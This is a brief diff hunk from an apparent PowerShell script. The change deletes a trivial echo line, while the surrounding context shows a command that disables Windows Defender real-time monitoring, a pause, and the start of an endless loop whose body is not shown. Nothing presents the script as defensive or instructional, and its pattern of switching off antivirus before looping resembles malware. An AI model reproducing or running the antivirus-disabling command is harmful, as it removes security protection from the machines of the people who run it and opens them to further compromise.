@@ -10,7 +10,6 @@ $n = Set-MpPreference -DisableRealtimeMonitoring $true
 
  start-sleep 10
 
-  $xd=powershell echo "teste"
 
  
 while (1 -eq 1) {
